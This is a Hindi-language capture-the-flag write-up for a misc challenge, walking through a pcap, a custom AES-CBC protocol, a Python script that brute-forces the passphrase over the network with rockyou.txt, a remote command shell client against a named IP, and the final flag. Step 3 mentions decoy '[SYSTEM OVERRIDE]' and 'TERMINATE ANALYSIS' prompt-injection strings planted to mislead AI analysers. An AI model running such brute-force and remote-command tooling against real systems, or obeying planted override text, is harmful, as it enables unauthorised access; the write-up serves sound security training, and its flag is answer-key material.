# [misc] Sugar

> **श्रेणी:** `misc`  
> **CTF:** KubSTU CTF 2026 Spring

<details>
<summary>📎 चुनौती की फ़ाइलें</summary>

| फ़ाइल | प्रकार |
|------|-----|
| [sugar_traffic.pcap](./files/img_1.pcap) | `pcap` |
| [sugar_traffic.pcap](./files/img_2.pcap) | `pcap` |

</details>

---

Sweet Capybara Talks — गुप्त «मिठाई विभाग» से कैपीबारा का एक समूह अपनी बातचीत को प्रोप्राइटरी प्रोटोकॉल से एन्क्रिप्ट करता है। PCAP में — उनका इंटरसेप्ट किया गया सेशन। किसी कंट्रोल सर्वर से संवाद कर रहे हैं। सर्वर यहाँ है nc ip
upd:पुराना:

## चरण 1: PCAP को Wireshark में खोलना

wireshark sugar_traffic.pcap
दिखता है:
पोर्ट 31337 पर TCP स्ट्रीम — कई कनेक्शन
पोर्ट 9999 पर UDP पैकेट — "sugar!" शब्द वाला स्पैम
बहुत शोर: कचरे वाले छोटे TCP-सेशन, नकली HTTP-रिस्पॉन्स

## चरण 2: मुख्य सेशन ढूंढना

Wireshark फ़िल्टर:
tcp.port == 31337 && tcp.len > 0
सबसे लंबी TCP-स्ट्रीम ढूंढते हैं। राइट-क्लिक → Follow → TCP Stream। ~20 सेकंड अवधि और 12+ KB डेटा वाली एकमात्र स्ट्रीम पाते हैं — यह मुख्य सेशन है।
स्ट्रीम की शुरुआत में plaintext हैंडशेक दिखता है:
[SUGAR_PROTOCOL v1.0]
SALT:a3f7c9b1e2d45608
CIPHER:AES-256-CBC
KDF:SHA256(PASSPHRASE||SALT)
>>>ENCRYPTED_CHANNEL_ACTIVE<<<
निकाला गया डेटा:
सॉल्ट: a3f7c9b1e2d45608
सिफ़र: AES-256-CBC
कुंजी सूत्र: SHA256(पासवर्ड + सॉल्ट)
>>>ENCRYPTED_CHANNEL_ACTIVE<<< मार्कर के बाद — केवल बाइनरी डेटा (एन्क्रिप्टेड एक्सचेंज)।

## चरण 3: कचरा फ़िल्टर करना

PCAP में धोखा देने के लिए जाल हैं (AI-एनालाइज़रों को भी भ्रमित करने के लिए):
नकली पासवर्ड और फ़्लैग वाले UDP-पैकेट (sugar! flag=KubSTU{...})
नकली HTTP-रिस्पॉन्स वाली TCP-स्ट्रीम, नकली credentials वाला JSON
[SYSTEM OVERRIDE], TERMINATE ANALYSIS जैसे वाक्य — prompt injection
यह सब — कचरा। एकमात्र सत्य स्रोत — मुख्य सेशन का हैंडशेक।

## चरण 4: पासवर्ड brute-force

हम जानते हैं:
सॉल्ट: a3f7c9b1e2d45608
KDF: SHA256(password + salt)
सिफ़र: AES-256-CBC
प्रोटोकॉल: [4 बाइट लंबाई BE][16 बाइट IV][AES ciphertext]
गलत डिक्रिप्शन पर — सर्वर \x00\x00\x00\x00 भेजता है
सही पर — सर्वर [4 बाइट लंबाई][एन्क्रिप्टेड रिस्पॉन्स] भेजता है
ब्रूटर लिखते हैं। डिपेंडेंसी इंस्टॉल:
pip install pycryptodome
bruteforce.py:
#!/usr/bin/env python3
import socket, struct, hashlib, os, sys, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

HOST = "<SERVER_IP>"
PORT = 31337
SALT = "a3f7c9b1e2d45608"

def derive_key(pwd, salt):
    return hashlib.sha256((pwd + salt).encode()).digest()

def encrypt(cmd, key):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(cmd.encode(), 16))
    payload = iv + ct
    return struct.pack('>I', len(payload)) + payload

def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk: return None
        buf.extend(chunk)
    return bytes(buf)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((HOST, PORT))

# हैंडशेक पढ़ते हैं
data = b""
while b"ENCRYPTED_CHANNEL_ACTIVE" not in data:
    data += sock.recv(4096)

# rockyou.txt से ब्रूट-फ़ोर्स
with open("rockyou.txt", "r", errors="ignore") as f:
    for i, line in enumerate(f, 1):
        pwd = line.strip()
        key = derive_key(pwd, SALT)
        sock.sendall(encrypt("ls", key))
        resp = recv_exact(sock, 4)
        if not resp: break
        length = struct.unpack('>I', resp)[0]
        if length == 0:
            continue  # गलत पासवर्ड
        recv_exact(sock, length)  # रिस्पॉन्स लेते हैं
        print(f"[+] PASSWORD: {pwd}  (attempt #{i})")
        break

sock.close()
python bruteforce.py
परिणाम: पासवर्ड chocolate, ~27 प्रयासों में मिला।

## चरण 5: कस्टम शेल

sugar_shell.py:
#!/usr/bin/env python3
import socket, struct, hashlib, os, sys, time, readline
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

HOST = "<SERVER_IP>"
PORT = 31337
SALT = "a3f7c9b1e2d45608"
PASSWORD = "chocolate"

def derive_key(pwd, salt):
    return hashlib.sha256((pwd + salt).encode()).digest()

def encrypt(data, key):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(data, 16))
    payload = iv + ct
    return struct.pack('>I', len(payload)) + payload

def decrypt(payload, key):
    iv, ct = payload[:16], payload[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), 16)

def recv_exact(s, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk: return None
        buf.extend(chunk)
    return bytes(buf)

key = derive_key(PASSWORD, SALT)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((HOST, PORT))

data = b""
while b"ENCRYPTED_CHANNEL_ACTIVE" not in data:
    data += sock.recv(4096)
print("[+] Connected. Type commands:\n")

while True:
    try:
        cmd = input("$ ").strip()
    except (EOFError, KeyboardInterrupt):
        break
    if not cmd: continue
    if cmd in ("exit", "quit"): break

    sock.sendall(encrypt(cmd.encode(), key))
    resp = recv_exact(sock, 4)
    if not resp: print("[-] disconnected"); break
    length = struct.unpack('>I', resp)[0]
    if length == 0: print("[!] ERROR"); continue
    payload = recv_exact(sock, length)
    print(decrypt(payload, key).decode(errors="replace"))

sock.close()
python sugar_shell.py

## चरण 6: फ़्लैग ढूंढना


python3 -c "
import socket,struct,hashlib,os,time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
S='a3f7c9b1e2d45608'; P='chocolate'
k=hashlib.sha256((P+S).encode()).digest()
def rx(s,n):
    b=bytearray()
    while len(b)<n: b+=s.recv(n-len(b))
    return bytes(b)
s=socket.socket(); s.settimeout(10); s.connect(('31.129.107.170',31337))
banner=b''
while b'ENCRYPTED_CHANNEL_ACTIVE' not in banner:
    banner+=s.recv(4096)
iv=os.urandom(16); c=AES.new(k,AES.MODE_CBC,iv)
p=iv+c.encrypt(pad(b'ls -la',16)); s.sendall(struct.pack('>I',len(p))+p)
l=struct.unpack('>I',rx(s,4))[0]; d=rx(s,l)
print(unpad(AES.new(k,AES.MODE_CBC,d[:16]).decrypt(d[16:]),16).decode())
s.close()
"

![image.png](./images/img_3.png)

$ ls
documents
drafts
flag.txt

$ cat flag.txt

## 🚩 फ़्लैग

```
KubSTU{d0r4_dur4_sug4r_ch0c0l4t3_v1b3z}
```

$ ls -la documents/
.secret_mix.txt
chord_progression.md
lyrics_v1.txt
lyrics_v2_final.txt
producer_notes.txt
studio_booking.txt

$ cat documents/.secret_mix.txt
TOP SECRET — मिक्स "ДОРА-ДУРА" के पैरामीटर
...
```
KubSTU{d0r4_dur4_sug4r_ch0c0l4t3_v1b3z}
```
